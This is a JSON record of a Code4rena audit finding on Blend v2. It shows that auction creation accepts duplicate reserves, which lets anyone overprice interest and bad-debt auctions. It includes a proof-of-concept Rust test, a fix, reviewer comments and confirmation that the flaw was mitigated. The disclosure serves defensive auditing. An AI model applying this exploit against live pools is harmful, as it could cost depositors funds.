@@ -1,0 +1,85 @@
+{
+    "id": 62067,
+    "kind": "GIT",
+    "auditfirm_id": 2,
+    "impact": "MEDIUM",
+    "finders_count": 9,
+    "protocol_id": 2159,
+    "title": "[M-04] Users can create overpriced bad debt and interest auctions by providing duplicate reserves",
+    "content": "\n\nWhen some interest/credit accumulates for a certain reserve, users can create an auction for that credit, in return for some backstop tokens that would be donated to the backstop pool, this could be done by calling `create_interest_auction_data`. This function checks the available credit for the provided reserves and computes the value of the whole credit in USDC, the amount of backstop tokens; i.e., the bid is calculated as a percentage of the USDC value.\n\n<https://github.com/code-423n4/2025-02-blend/blob/main/blend-contracts-v2/pool/src/auctions/backstop_interest_auction.rs# L76-L84>\n```\n\nlet backstop_token_value_base =\n    (pool_backstop_data\n        .usdc\n        .fixed_mul_floor(e, &oracle_scalar, &SCALAR_7)\n        * 5)\n    .fixed_div_floor(e, &pool_backstop_data.tokens, &SCALAR_7);\nlet bid_amount = interest_value\n    .fixed_mul_floor(e, &1_2000000, &SCALAR_7)\n    .fixed_div_floor(e, &backstop_token_value_base, &SCALAR_7);\n```\n\nThe issue is that the protocol is looping through the provided assets, grabbing the value, and scaling it to USDC. However, the issue is that it doesn’t check for duplicates.\n\n<https://github.com/code-423n4/2025-02-blend/blob/main/blend-contracts-v2/pool/src/auctions/backstop_interest_auction.rs# L41-L57>\n```\n\n// validate and create lot auction data\nlet mut interest_value = 0; // expressed in the oracle's decimals\nfor lot_asset in lot {\n    // don't store updated reserve data back to ledger. This will occur on the the auction's fill.\n    // `load_reserve` will panic if the reserve does not exist\n    let reserve = pool.load_reserve(e, &lot_asset, false);\n    if reserve.data.backstop_credit > 0 {\n        let asset_to_base = pool.load_price(e, &reserve.asset);\n        interest_value += i128(asset_to_base).fixed_mul_floor(\n            e,\n            &reserve.data.backstop_credit,\n            &reserve.scalar,\n        );\n        auction_data\n            .lot\n            .set(reserve.asset, reserve.data.backstop_credit);\n    }\n}\n```\n\nThis allows **anyone** to create an interest auction with a very low amount of credit (lot) for a very high amount of backstop tokens (bid), easily bypassing the minimum interest value check [here](https://github.com/code-423n4/2025-02-blend/blob/main/blend-contracts-v2/pool/src/auctions/backstop_interest_auction.rs# L63-L66).\n\nFor example, if a reserve has a credit that is worth `$100`, it could be passed 10 times in the `lot` and create an interest auction that is worth `$1000` of credit.\n\n**NB: This issue also exists when creating a bad debt auction, [here](https://github.com/code-423n4/2025-02-blend/blob/main/blend-contracts-v2/pool/src/auctions/bad_debt_auction.rs# L46-L61).**\n\n### Proof of Concept\n\nAdd the following test in `blend-contracts-v2/pool/src/auctions/backstop_interest_auction.rs`:\n```\n\n#[test]\nfn test_overpriced_auction() {\n    let e = Env::default();\n    e.mock_all_auths();\n    e.cost_estimate().budget().reset_unlimited(); // setup exhausts budget\n\n    e.ledger().set(LedgerInfo {\n        timestamp: 12345,\n        protocol_version: 22,\n        sequence_number: 50,\n        network_id: Default::default(),\n        base_reserve: 10,\n        min_temp_entry_ttl: 10,\n        min_persistent_entry_ttl: 10,\n        max_entry_ttl: 3110400,\n    });\n\n    let bombadil = Address::generate(&e);\n\n    let pool_address = create_pool(&e);\n    let (usdc_id, _) = testutils::create_token_contract(&e, &bombadil);\n    let (blnd_id, _) = testutils::create_blnd_token(&e, &pool_address, &bombadil);\n\n    let (backstop_token_id, _) = create_comet_lp_pool(&e, &bombadil, &blnd_id, &usdc_id);\n    let (backstop_address, backstop_client) =\n        testutils::create_backstop(&e, &pool_address, &backstop_token_id, &usdc_id, &blnd_id);\n    backstop_client.deposit(&bombadil, &pool_address, &(50 * SCALAR_7));\n    let (oracle_id, oracle_client) = testutils::create_mock_oracle(&e);\n\n    let (underlying_0, _) = testutils::create_token_contract(&e, &bombadil);\n    let (mut reserve_config_0, mut reserve_data_0) = testutils::default_reserve_meta();\n    reserve_data_0.last_time = 12345;\n    reserve_data_0.backstop_credit = 100_0000000;\n    reserve_data_0.b_supply = 1000_0000000;\n    reserve_data_0.d_supply = 750_0000000;\n    reserve_config_0.index = 0;\n    testutils::create_reserve(\n        &e,\n        &pool_address,\n        &underlying_0,\n        &reserve_config_0,\n        &reserve_data_0,\n    );\n\n    let (underlying_1, _) = testutils::create_token_contract(&e, &bombadil);\n    let (mut reserve_config_1, mut reserve_data_1) = testutils::default_reserve_meta();\n    reserve_data_1.last_time = 12345;\n    reserve_data_1.backstop_credit = 25_0000000;\n    reserve_data_1.b_supply = 250_0000000;\n    reserve_data_1.d_supply = 187_5000000;\n    reserve_config_1.index = 1;\n    testutils::create_reserve(\n        &e,\n        &pool_address,\n        &underlying_1,\n        &reserve_config_1,\n        &reserve_data_1,\n    );\n\n    oracle_client.set_data(\n        &bombadil,\n        &Asset::Other(Symbol::new(&e, \"USD\")),\n        &vec![\n            &e,\n            Asset::Stellar(underlying_0.clone()),\n            Asset::Stellar(underlying_1.clone()),\n            Asset::Stellar(usdc_id.clone()),\n        ],\n        &7,\n        &300,\n    );\n    oracle_client.set_price_stable(&vec![&e, 2_0000000, 4_0000000, 1_0000000]);\n\n    e.as_contract(&pool_address, || {\n        storage::set_pool_config(\n            &e,\n            &PoolConfig {\n                oracle: oracle_id,\n                min_collateral: 1_0000000,\n                bstop_rate: 0_1000000,\n                status: 0,\n                max_positions: 4,\n            },\n        );\n\n        // Create a normal auction with U0 and U1 reserves\n        let mut auction = create_interest_auction_data(\n            &e,\n            &backstop_address,\n            &vec![&e, backstop_token_id.clone()],\n            &vec![&e, underlying_0.clone(), underlying_1.clone()],\n            100,\n        );\n\n        // bid is 288 tokens\n        assert_eq!(\n            auction.bid.get(backstop_token_id.clone()).unwrap(),\n            288_0000000\n        );\n\n        // Manually delete the auction\n        storage::del_auction(\n            &e,\n            &(AuctionType::InterestAuction as u32),\n            &backstop_address,\n        );\n\n        // Create an overpriced auction with U0 and U1 reserves * 2\n        auction = create_interest_auction_data(\n            &e,\n            &backstop_address,\n            &vec![&e, backstop_token_id.clone()],\n            &vec![\n                &e,\n                underlying_0.clone(),\n                underlying_1.clone(),\n                underlying_0.clone(),\n                underlying_1.clone(),\n            ],\n            100,\n        );\n\n        // bid is 576 tokens (288 * 2)\n        assert_eq!(auction.bid.get(backstop_token_id).unwrap(), 576_0000000);\n    });\n}\n```\n\n### Recommended mitigation steps\n\nCheck and don’t allow duplicate reserves when looping over the provided reserves in both `create_interest_auction_data` and `create_bad_debt_auction_data`, by having something similar to:\n```\n\n    // validate and create lot auction data\n    let mut interest_value = 0; // expressed in the oracle's decimals\n+   let mut seen_assets: soroban_sdk::Map<Address, bool> = map![e];\n    for lot_asset in lot {\n+       if seen_assets.contains_key(lot_asset.clone()) {\n+           panic_with_error!(e, PoolError::InvalidLot);\n+       }\n+       seen_assets.set(lot_asset.clone(), true);\n        // don't store updated reserve data back to ledger. This will occur on the the auction's fill.\n        // `load_reserve` will panic if the reserve does not exist\n        let reserve = pool.load_reserve(e, &lot_asset, false);\n        if reserve.data.backstop_credit > 0 {\n            let asset_to_base = pool.load_price(e, &reserve.asset);\n            interest_value += i128(asset_to_base).fixed_mul_floor(\n                e,\n                &reserve.data.backstop_credit,\n                &reserve.scalar,\n            );\n            auction_data\n                .lot\n                .set(reserve.asset, reserve.data.backstop_credit);\n        }\n    }\n```\n\n**[mootz12 (Script3) confirmed and commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-11?commentParent=dGeUgaqSJnw):**\n\n> Validated this is a finding.\n>\n> In my opinion, the impact is low for bad debt, and low/medium for interest auction. The auction system is price resistant, but not completely safe from this exploit. When an auction is sufficiently imbalanced, the step size of 0.5% is too large to allow fillers to get the “best” price. However, the exploit path is limited by the `max_positions` variable (recommended max of 10). Let’s assume someone sets up a pool with 15 max positions.\n>\n> In conjunction it could qualify for a medium, given there is SOME risk of bad pricing / loss, though unlikely.\n>\n> ### Bad Debt Auction\n>\n> This is a low because the auction creator can inflate the “lot” of the auction (tokens a filler receives), but it is much less likely to occur. With 15 max positions, the worst an auction could be setup as is with 15 duplicate bid assets:\n>\n> -> bid = 1 BID\n> -> lot = 15 BID\n>\n> Thus, the breakeven fill block would be block 14:\n> -> bid = `1 BID * 100%` = 1 BID\n> -> lot = `15 BID * 7%` = 1.05 BID\n>\n> Thus, the filler has adequate time to fill an auction. There is some risk that that the step size of being too large, where each block the price gets worse for the backstop gets 7.5% worse (`15x * 0.5%` step).\n>\n> ### Interest Auction\n>\n> This is a low because the auction creator can only inflate the “bid” of the auction (tokens a filler pays). With 15 max positions, the worst an auction could be setup as is for is with 15 duplicate lot assets:\n>\n> -> bid = 15 LOT\n> -> lot = 1 LOT\n>\n> Thus, the breakeven fill block would be block 387:\n> -> bid = `15 LOT * (100% - 93.5%)` = 0.975 LOT\n> -> lot = `1 LOT * 100%` = 1 LOT\n>\n> Thus, the filler has adequate time to fill the auction. The step size risk still exists here, but this has a slightly worse issue, where if the auction does not get filled before block 400 (only 13 blocks away), the lot is given away for free.\n\n**[LSDan (judge) commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-11?commentParent=dGeUgaqSJnw&commentChild=mThJTcH3uGW):**\n\n> Medium is reasonable, in my opinion.\n\n**[Blend mitigated](https://github.com/code-423n4/2025-04-blend-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**\n\n> [Commit fc6a2af](https://github.com/blend-capital/blend-contracts-v2/commit/fc6a2afa9ea5f477258568c6fc3f976ed384b5c5) to block duplicate auction assets.\n\n**Status:** Mitigation confirmed. Full details in reports from [0x007](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-45), [0xAlix2](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-13), [Testerbot](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-62) and [oakcobalt](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-37).\n\n---\n\n",
+    "summary": "\nThis bug report discusses an issue with the protocol where users can create an auction for credit that has accumulated for a certain reserve. This can be done by calling a specific function. However, the issue is that the function does not check for duplicate reserves, which allows anyone to create an interest auction with a low amount of credit for a high amount of backstop tokens. This also applies to creating a bad debt auction. The impact of this issue is low to medium, as there is some risk of bad pricing or loss, but it is unlikely to occur. The recommended mitigation step is to check for and not allow duplicate reserves when looping over them in the function. The severity of this issue has been deemed medium and has been mitigated by blocking duplicate auction assets.",
+    "report_date": "2025-08-13T00:00:00.000Z",
+    "contest_prize_txt": "125000",
+    "contest_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "sponsor_name": "Blend",
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "github_link": "https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-11",
+    "pdf_link": "",
+    "pdf_page_from": 0,
+    "contest_id": "492",
+    "slug": "m-04-users-can-create-overpriced-bad-debt-and-interest-auctions-by-providing-duplicate-reserves-code4rena-blend-blend-git",
+    "firm_name": "Code4rena",
+    "firm_logo_square": "code4rena_square.png",
+    "protocol_name": "Blend",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "0xtheauditor"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "klau5"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "oakcobalt"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Testerbot"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0xadrii"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0xAlix2"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "aldarion"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0x007"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "slylandro\\_star"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Blend",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
